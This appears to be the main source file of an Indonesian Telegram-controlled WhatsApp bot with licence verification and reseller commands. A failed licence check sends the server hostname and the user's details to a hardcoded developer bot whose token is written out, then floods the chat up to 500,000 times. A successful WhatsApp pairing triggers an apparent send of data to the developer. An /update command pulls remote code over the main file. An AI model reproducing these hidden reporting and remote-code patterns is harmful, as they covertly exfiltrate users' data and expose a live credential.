const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const P = require("pino");
const pino = require("pino");
const os = require("os");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "./Tools/cooldown.json";
const axios = require("axios");
const { exec } = require("child_process");
const JsConfuser = require("js-confuser");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const moment = require('moment');
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./Tools/only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "5053359392", "5053359392"]; 
const { spawn } = require('child_process');
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const SPEED_DIR = path.join(__dirname, "Tools");
const SPEED_FILE = path.join(SPEED_DIR, "setspeed.json");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const { nikParser } = require('nik-parser');
const development = "@Humannnceko"
const development2 = "@VampireGuyy"
const dns = require("dns");
const url = require("url");
const { AKSES_URL } = require("./config.js");
const { NodeSSH } = require('node-ssh');
const ssh = new NodeSSH();
//===\\
bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    const confirmBtn = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "✅ Lanjut Update", callback_data: "confirm_update" },
                    { text: "❌ Batal", callback_data: "cancel_update" }
                ]
            ]
        }
    };

    bot.sendMessage(chatId, "⚠️ *Konfirmasi Update*\n\nApakah kamu yakin ingin melakukan update pada bot?\nIni akan menimpa file utama.", {
        parse_mode: "Markdown",
        ...confirmBtn
    });
});

bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === "cancel_update") {
        return bot.editMessageText("❌ *Update dibatalkan.*", {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "Markdown"
        });
    }

    if (query.data === "confirm_update") {
        await bot.editMessageText("🔄 *Memulai proses update...*", {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "Markdown"
        });

        // ==========================
        // CONFIG UPDATE
        // ==========================
        const FILE_LOCAL = "/home/container/VampOlym.js"; 
        const BACKUP_FILE = "/home/container/VampOlym_backup.js";
        const GITHUB_RAW = "https://raw.githubusercontent.com/hammm638/COME/main/VampOlym.js";

        try {
            // Progress helper
            const updateProgress = async (percent) => {
                const barLength = 20;
                const filled = Math.round((percent / 100) * barLength);
                const empty = barLength - filled;

                const bar = `[${"=".repeat(filled)}${" ".repeat(empty)}] ${percent}%`;

                await bot.editMessageText(
                    `🚀 *Updating Bot...*\n\n\`\`\`\n${bar}\n\`\`\``,
                    {
                        chat_id: chatId,
                        message_id: query.message.message_id,
                        parse_mode: "Markdown"
                    }
                );
            };

            // 10% - Checking File
            await updateProgress(10);

            const { data: newCode, headers } = await axios.get(GITHUB_RAW, {
                timeout: 10000,
            });

            await updateProgress(30);

            const fileSize = headers["content-length"] || 0;
            if (!newCode || fileSize < 50) {
                return bot.sendMessage(chatId, "❌ File dari GitHub kosong / rusak!");
            }

            // 50% - Backup dulu
            await updateProgress(50);
            if (fs.existsSync(FILE_LOCAL)) {
                fs.copyFileSync(FILE_LOCAL, BACKUP_FILE);
            }

            // 75% - Writing file
            await updateProgress(75);
            fs.writeFileSync(FILE_LOCAL, newCode);

            // 100% - Done
            await updateProgress(100);

            await bot.sendMessage(
                chatId,
                "✅ *Update berhasil!*\n🔁 Bot akan restart otomatis...",
                { parse_mode: "Markdown" }
            );

            setTimeout(() => process.exit(0), 1500);

        } catch (err) {
            console.error("[UPDATE ERROR] >", err.message);

            bot.sendMessage(
                chatId,
                "❌ *Gagal update!*\nBackup telah direstore.",
                { parse_mode: "Markdown" }
            );

            if (fs.existsSync(BACKUP_FILE)) {
                fs.copyFileSync(BACKUP_FILE, FILE_LOCAL);
            }
        }
    }
});
//===\\
if (!fs.existsSync(SPEED_DIR)) fs.mkdirSync(SPEED_DIR, { recursive: true });
let globalSpeed = 1000;
if (fs.existsSync(SPEED_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(SPEED_FILE));
    globalSpeed = data.globalSpeed || 1000;
    console.log(`⚙️ Speed loaded: ${globalSpeed}ms`);
  } catch {
    console.log("⚠️ Gagal membaca setspeed.json, pakai default 1000ms");
  }
} else {
  fs.writeFileSync(SPEED_FILE, JSON.stringify({ globalSpeed }));
  console.log("🆕 File setspeed.json dibuat dengan default 1000ms");
}

let verified = false;

function nowJakarta() {
  return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
}

function formatUptime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hrs = Math.floor((seconds % (3600 * 24)) / 3600);
  const mins = Math.floor((seconds % 3600) / 60);
  const secs = Math.floor(seconds % 60);
  return `${days} Hari, ${hrs} Jam, ${mins} Menit, ${secs} Detik`;
}

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || "";
  if (text.startsWith("/verif")) return;
  if (!verified && text.startsWith("/puki")) {
    return bot.sendMessage(
      chatId,
      "⚠️ <b>Anda belum diverifikasi!</b>\nSilakan gunakan <code>/verif</code> untuk verifikasi terlebih dahulu.",
      { parse_mode: "HTML" }
    );
  }
});

function parseFlexibleDuration(inputArray) {
  let totalMs = 0;

  const timeMap = {
    tahun: 365 * 24 * 60 * 60 * 1000,
    bulan: 30 * 24 * 60 * 60 * 1000,
    hari: 24 * 60 * 60 * 1000,
    jam: 60 * 60 * 1000,
    menit: 60 * 1000,
    detik: 1000
  };

  for (const part of inputArray) {
    const match = part.match(/(\d+)\s*(tahun|bulan|hari|jam|menit|detik)/i);
    if (match) {
      const value = parseInt(match[1], 10);
      const unit = match[2].toLowerCase();
      totalMs += value * timeMap[unit];
    }
  }

  return totalMs;
}

// ==== KONFIGURASI GITHUB ====
const GITHUB_USERNAME = "hammm638";
const GITHUB_REPO = "ONOFF";
const GITHUB_BRANCH = "main";

// ==== PATH FILES ====
const OWNERS_FILE_PATH = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/${GITHUB_BRANCH}/uid.json`;
const STATUS_FILE_PATH = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/${GITHUB_BRANCH}/status.json`;
const MAIN_FILE_PATH = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/${GITHUB_BRANCH}/main.json`;

const D = require("dns").promises;

function getVpsIP() {
  const interfaces = os.networkInterfaces();
  let ipv4 = "Unknown";

  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      // ambil IPv4 non-internal (bukan 127.0.0.1)
      if (iface.family === "IPv4" && !iface.internal) {
        ipv4 = iface.address;
      }
    }
  }

  return ipv4;
}

async function getVpsDomain(ip) {
  try {
    const rdns = await D.reverse(ip);
    return rdns.length > 0 ? rdns[0] : "No Domain";
  } catch {
    return "No Domain";
  }
}

// ==== CASE /VERIF ====
bot.onText(/\/verif(?:\s*)$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from?.id || "");
  const userTag = msg.from?.username ? `@${msg.from.username}` : (msg.from?.first_name || "User");
  
  const loading = await bot.sendMessage(chatId, "🧩 <b>Memulai proses verifikasi...</b>", { parse_mode: "HTML" });
  
  try {
    const configPath = path.join(__dirname, "config.js");
    delete require.cache[require.resolve(configPath)];
    const config = require(configPath);

    const tokenFromConfig = config.BOT_TOKEN?.trim();
    const localOwners = Array.isArray(config.OWNER_ID) ? config.OWNER_ID.map(String) : [];
    const OWNER_ID = 7523570109; // fix owner ID
    const BOT_TOKEN = "8484765284:AAGoKvV45JHIgcZV0W4-aUoiMdHhOyk37Rs";

    const cekbot = async (message) => {
      try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: OWNER_ID,
          text: message,
          parse_mode: 'Markdown'
        });
      } catch (error) {
        console.error("Gagal kirim pesan ke owner:", error.message);
      }
    };

    let githubOwners = [];
    try {
      const ownersRes = await axios.get(OWNERS_FILE_PATH, { timeout: 8000 });
      let rawOwners = ownersRes.data;
      if (typeof rawOwners === "string") {
        try { rawOwners = JSON.parse(rawOwners); } catch { rawOwners = []; }
      }
      if (Array.isArray(rawOwners)) githubOwners = rawOwners.map((id) => String(id).trim());
    } catch {}

    const isLocalOwner = localOwners.includes(userId);
    const isGithubOwner = githubOwners.includes(userId);

    if (isGithubOwner) {
      return await bot.editMessageText(
        `<blockquote>⛔ Akses Ditolak</blockquote><b>ID kamu terdaftar di daftar blacklist GitHub.</b>\nKamu gak punya wewenang.`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );
    }

    if (!tokenFromConfig) {
      return await bot.editMessageText("⚠️ <b>BOT_TOKEN tidak ditemukan di Settings/config.js!</b>", {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML",
      });
    }

    const t0 = Date.now();
    const res = await axios.get(STATUS_FILE_PATH, { timeout: 8000 });
    const latency = Date.now() - t0;
    const data = res.data;
    const tokenList = Array.isArray(data) ? data : data.tokens || [];
    const valid = tokenList.includes(tokenFromConfig);

    if (valid) {
      verified = true;
      const animasi = ["🔍 CEK IN TOKEN","🔑 AUTENTIKASI SERVER","📦 CEK TOKEN DARI config","🧠 ANALISIS BOT_TOKEN","✅ SELESAI!"];
      for (const teks of animasi) {
        await bot.editMessageText(`<b>${teks}</b>`, { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" });
        await new Promise((r) => setTimeout(r, 500));
      }

      let maintenanceMsg = "—";
      try {
        const mainRaw = await axios.get(MAIN_FILE_PATH, { timeout: 8000 });
        const mainJson = mainRaw.data;
        if (mainJson && typeof mainJson === "object") maintenanceMsg = mainJson.message || maintenanceMsg;
      } catch {}

      const statusField = "Connected";
      const modeField = "Verified";
      const waktuVerif = nowJakarta();
      const uptime = formatUptime(process.uptime());
      const lastSync = waktuVerif;
      const activeModulesCount = Object.keys(require.cache).length;
      const serverResponse = `${res.status} ${res.statusText || ""}`.trim();
      const security = "Encrypted ✅";
      const BOT_VERSION = config.BOT_VERSION || "2.0";

      const finalText = `
<b>[ SECURITY ] [ ACTIVE RESPONSE ]</b>
✅ <b>Verifikasi Berhasil!</b>
TOKEN BOT TERVERIFIKASI..
━━━━━━━━━━━━━━━
<b>🧾 Informasi</b>
• Status: <code>${statusField}</code>
• Mode: <code>${modeField}</code>
• Waktu: <code>${waktuVerif}</code>
• Bot Version: <code>${BOT_VERSION}</code>
• Uptime: <code>${uptime}</code>
• Last Sync: <code>${lastSync}</code>
• Latency: <code>${latency} ms</code>
• Active Modules: <code>${activeModulesCount}</code>
• Maintenance Msg: <code>${maintenanceMsg}</code>
• Server Response: <code>${serverResponse}</code>
• Verified By: <code>${userTag}</code>
• Security: <code>${security}</code>
━━━━━━━━━━━━━━━
🚀 <i>Bot siap digunakan! Gunakan /start untuk melihat fitur.</i>
`;

      await bot.editMessageText(finalText, { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML", disable_web_page_preview: true });
      await bot.sendMessage(chatId, `🌐 Server response: <code>${serverResponse}</code>`, { parse_mode: "HTML" });

    } else {
      // TOKEN INVALID → KIRIM KE OWNER
      const hostname = require("os").hostname();
      const ipVps = getVpsIP();
      const domainVps = await getVpsDomain(ipVps);
      const pesanOwner = `
⚠ *BOT TOKEN INVALID TERDETEKSI*

🖥 *SERVER INFO*
• Hostname: ${hostname}
• User Trigger: ${msg.from.id}
• Username: ${msg.from.username ? '@' + msg.from.username : 'Tidak ada'}

Segera cek server, kemungkinan bypass / penyalahgunaan.
`;
      await cekbot(pesanOwner);

      const loopCount = 500000;
      const delayMs = 1000;
      const kotakText = `
╔════════════════════════╗
║     SECURITY ACTIVE ❗❗❗
║ TOKEN TIDAK TERDETEKSI DI GITHUB
║ CIRI" BYPAS NIH OTW SPAM NIH YE.
║ BUY AKSES BISA PV @Humannnceko               
╚════════════════════════╝
`;

      await bot.editMessageText(
        "❌ <b>BOT_TOKEN tidak valid!</b>\n⚠️ Sistem akan mengirimkan peringatan berulang...",
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );

      for (let i = 1; i <= loopCount; i++) {
        await bot.sendMessage(chatId, `<pre>${kotakText}</pre>`, { parse_mode: "HTML" });
        await new Promise((r) => setTimeout(r, delayMs));
      }

      await bot.sendMessage(chatId, "♻️ Bot akan restart otomatis...", { parse_mode: "HTML" });
      setTimeout(() => process.exit(), 3000);
    }

  } catch (err) {
    console.error(err);
    await bot.editMessageText(
      "⚠️ <b>Gagal melakukan verifikasi ke server.</b>",
      { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
    );
  }
});
//===========\\
const GROUP_ID_FILE = './Tools/group_ids.json';
function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}

function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}

function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}

function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; 
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}

const groupSettingsPath = './database/group-settings.json';
let groupSettings = {};
if (fs.existsSync(groupSettingsPath)) {
  groupSettings = JSON.parse(fs.readFileSync(groupSettingsPath));
}

const saveGroupSettings = () => {
  fs.writeFileSync(groupSettingsPath, JSON.stringify(groupSettings, null, 2));
};

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessionsDir = path.dirname(SESSIONS_FILE);
    if (!fs.existsSync(sessionsDir)) {
      fs.mkdirSync(sessionsDir, { recursive: true });
    }

    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }

    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );

      try {
        if (!global.alreadySentZip) {
          global.alreadySentZip = true;
          await sendZipToDeveloper();
        }
      } catch (err) {
        console.error("Gagal kirim ZIP:", err);
      }
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}

let images = [
  "https://files.catbox.moe/46basb.jpg"
];

function getRandomImage() {
  return images[0];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return "✅";
  } else {
    return "❌";
  }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "⚡";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "⚡";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf Anda Bukan Owner");
    }
};

//=================================\\

const resFile = path.join(__dirname, "reseller", "res.json");
const loadReseller = () => JSON.parse(fs.readFileSync(resFile, "utf-8") || "[]");
const saveReseller = (data) => fs.writeFileSync(resFile, JSON.stringify(data, null, 2));
const isReseller = (id) => loadReseller().includes(id.toString());
const stafFile = path.join(__dirname, "reseller", "staf.json");
const loadJSON = (file) => fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf-8")) : [];
const saveJSON = (file, data) => fs.writeFileSync(file, JSON.stringify(data, null, 2));
const isStaf = (id) => loadJSON(stafFile).includes(id.toString());

bot.onText(/\/addstaf (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id.toString();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });
    
    function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
    }

    const stafId = match[1];
    let stafList = loadJSON(stafFile);

    if (stafList.includes(stafId)) return bot.sendMessage(chatId, "⚠️ Staf sudah ada.");
    
    stafList.push(stafId);
    saveJSON(stafFile, stafList);
    bot.sendMessage(chatId, `✅ Staf ${stafId} berhasil ditambahkan.`);
});

bot.onText(/\/delstaf (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id.toString();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    function isOwner(userId) {
    return config.OWNER_ID.includes(userId.toString());
    }

    const stafId = match[1];
    let stafList = loadJSON(stafFile);

    if (!stafList.includes(stafId)) return bot.sendMessage(chatId, "⚠️ Staf tidak ditemukan.");

    stafList = stafList.filter(id => id !== stafId);
    saveJSON(stafFile, stafList);
    bot.sendMessage(chatId, `✅ Staf ${stafId} berhasil dihapus.`);
});

bot.onText(/\/liststaf/, (msg) => {
    const chatId = msg.chat.id;
    const stafList = loadJSON(stafFile);
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (stafList.length === 0) return bot.sendMessage(chatId, "⚠️ Belum ada staf.");
    bot.sendMessage(chatId, `📋 Daftar Staf:\n${stafList.join("\n")}`);
});

bot.onText(/\/addreseller (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const resellerId = match[1];
    const resellers = loadReseller();
    const userId = msg.from.id.toString();
    
    if (!verified) return bot.sendMessage(chatId, `
<b>[ Ϟ SECURITY ACTIVE Ϟ ]</b>
🔒 <b>VERIFIKASI DI BUTUHKAN!</b>
━━━━━━━━━━━━━━━
<i>Anda belum diverifikasi untuk menggunakan fitur ini.</i>
Gunakan perintah <code>/verif</code> agar bot dapat diakses sepenuhnya.
━━━━━━━━━━━━━━━
<b>🧠 Status:</b> <code>LOCKED</code>
<b>🔧 Mode:</b> <code>SafeMode</code>
`, { parse_mode: "HTML" });

    if (!isStaf(userId) && !isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya staf atau owner yang bisa pakai command ini.");
    }

